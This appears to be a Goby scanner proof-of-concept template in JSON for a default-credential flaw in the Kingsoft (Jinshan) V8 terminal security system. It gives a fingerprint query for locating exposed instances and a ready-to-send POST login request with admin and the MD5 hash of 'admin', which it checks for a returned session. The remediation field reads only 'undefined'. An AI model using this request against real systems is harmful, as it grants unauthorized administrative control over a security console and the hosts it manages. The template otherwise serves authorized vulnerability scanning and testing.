{
    "Name": "Kingsoft V8 Default weak password",
    "Level": "2",
    "Tags": [
        "Default weak password"
    ],
    "GobyQuery": "app=\"Falcon Safety - Jinshan V8 + Terminal Safety System\" || app=\"猎鹰安全-金山V8+终端安全系统\"",
    "Description": "The default weak password exists in the Jinshan V8 terminal security system, so the attacker can obtain all the host permissions (admin/admin)",
    "Product": "Kingsoft V8",
    "Homepage": "https://www.ejinshan.net/",
    "Author": "PeiQi",
    "Impact": "<p>the attacker can obtain all the host permissions</p>",
    "Recommendation": "<p>undefined</p>",
    "References": [
        "http://wiki.peiqi.tech"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/inter/ajax.php?cmd=get_user_login_cmd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "{\"get_user_login_cmd\":{\"name\":\"admin\",\"password\":\"21232f297a57a5a743894a0e4a801fc3\"}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "userSession",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "PostTime": "2021-04-12 11:16:16",
    "GobyVersion": "1.8.258",
    "PocId": "10182"
}